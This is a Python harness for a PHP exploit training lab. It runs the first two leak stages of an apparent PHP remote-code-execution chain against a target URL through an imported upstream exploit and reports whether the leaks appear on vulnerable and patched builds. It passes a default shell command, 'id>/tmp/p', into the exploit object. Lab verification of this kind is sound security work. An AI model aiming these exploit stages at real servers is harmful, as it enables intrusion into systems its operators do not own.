#!/usr/bin/env python3
"""Stage-1 / stage-2 leak assertion for the PHP2Shell training lab.

This deliberately runs only the CVE's memory-safety primitives -- the stale
`PS(id)` OOM leak (stage 1) and the libphp `zval_ptr_dtor` leak (stage 2) --
and never stage 3. It is the part of the chain that is expected to reproduce on
the vulnerable build and to be absent on the fixed and hardened controls.

The toolkit is not reimplemented here: this script imports the pinned
toolkit's calibration helpers and its patched copy of the 9bie upstream exploit
(the same code path `php2shell_calibrate.py` uses), so a leak that this script
reports is a real Set-Cookie OOB read and not a heuristic.

Exit codes (the runner distinguishes these, so a control can never pass by
accident):
  0  both leaks reproduced
  2  requests completed and both leaks are absent (negative result)
  3  transport/setup error (NOT a negative result)
  4  stage 1 reproduced but stage 2 did not (partial; not a valid positive and
     not a valid negative)

Printed lines:
  LEAK_STAGE1=<hex|0x0>
  LEAK_STAGE2=<hex|0x0>
  LEAK_RESULT=<both|absent|partial>
  LEAK_JSON={...}   machine-readable summary
"""

from __future__ import annotations

import argparse
import json
import os
import sys


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--target", required=True)
    ap.add_argument("--toolkit", required=True, help="pinned toolkit checkout")
    ap.add_argument("--repo-dir", required=True,
                    help="staged upstream-legacy checkout (exploit.py)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--stage1-n", type=int, required=True)
    ap.add_argument("--stage1-len", type=int, required=True)
    ap.add_argument("--stage2-t", type=int, required=True)
    ap.add_argument("--stage2-v", type=int, default=16)
    ap.add_argument("--retries", type=int, default=5,
                    help="attempts per leak stage (stage 1 has a worker-fork "
                         "race: R2 must be served by the same child R1 left "
                         "stale; the upstream chain retries for this reason)")
    ap.add_argument("--command", default="id>/tmp/p")
    args = ap.parse_args()

    sys.path.insert(0, os.path.join(args.toolkit, "tools"))
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    try:
        import php2shell_calibrate as cal
        from php2shell_upstream import patch_cookie_decode, patch_params
        from amd64 import patch_amd64_filters
    except Exception as exc:  # pragma: no cover - environment failure
        print(f"LEAK_RESULT=error\nERROR=import failed: {exc}", flush=True)
        return 3

    try:
        patch_params(args.repo_dir)
        patch_cookie_decode(args.repo_dir)
        # Narrow the toolkit's wide pointer filters back to amd64 userspace;
        # see amd64.py for the measured false positive this prevents.
        patch_amd64_filters(args.repo_dir)
        mod = cal.load_upstream(args.repo_dir)
        target = mod.Target(args.target, verbose=False)
        ex = mod.Exploit(target, args.command, zif_offset=args.zif_offset,
                         dtor_offset=args.dtor_offset, profile="bookworm",
                         verbose=False)

        # Each stage needs a fresh worker: rotate first exactly as the
        # upstream chain does before stage 1. A miss is retried with a fresh
        # worker: stage 1 depends on R2 being served by the child that R1
        # aborted, and prefork can finish forking a replacement in between.
        chunk = n = forge = 0
        for attempt in range(1, max(1, args.retries) + 1):
            ex.rotate()
            chunk, n, forge = cal.calibrate_stage1(
                mod, ex, {"stage1_n": args.stage1_n,
                          "stage1_len": args.stage1_len})
            if chunk:
                break
            print(f"[*] stage 1 attempt {attempt}/{args.retries} missed", flush=True)
        if not chunk:
            print("LEAK_STAGE1=0x0\nLEAK_STAGE2=0x0\nLEAK_RESULT=absent", flush=True)
            print("LEAK_JSON=" + json.dumps({
                "stage1": None, "stage2": None, "result": "absent",
                "stage1_n": args.stage1_n, "stage1_len": args.stage1_len,
            }), flush=True)
            return 2

        lib = t_index = 0
        for attempt in range(1, max(1, args.retries) + 1):
            ex.rotate()
            lib, t_index = cal.calibrate_stage2(
                mod, ex, args.dtor_offset,
                {"stage2_t": args.stage2_t, "stage2_v": args.stage2_v})
            if lib:
                break
            print(f"[*] stage 2 attempt {attempt}/{args.retries} missed", flush=True)
        result = "both" if lib else "partial"
        print(f"LEAK_STAGE1=0x{chunk:x}", flush=True)
        print(f"LEAK_STAGE2=0x{lib:x}" if lib else "LEAK_STAGE2=0x0", flush=True)
        print(f"LEAK_RESULT={result}", flush=True)
        print("LEAK_JSON=" + json.dumps({
            "stage1": hex(chunk), "stage2": hex(lib) if lib else None,
            "result": result, "stage1_n": n, "stage1_forge_len": forge,
            "stage2_t": t_index, "stage2_v": args.stage2_v,
        }), flush=True)
        return 0 if lib else 4
    except Exception as exc:
        print(f"LEAK_STAGE1=0x0\nLEAK_STAGE2=0x0\nLEAK_RESULT=error", flush=True)
        print("LEAK_JSON=" + json.dumps({"result": "error", "error": repr(exc)}),
              flush=True)
        return 3


if __name__ == "__main__":
    sys.exit(main())
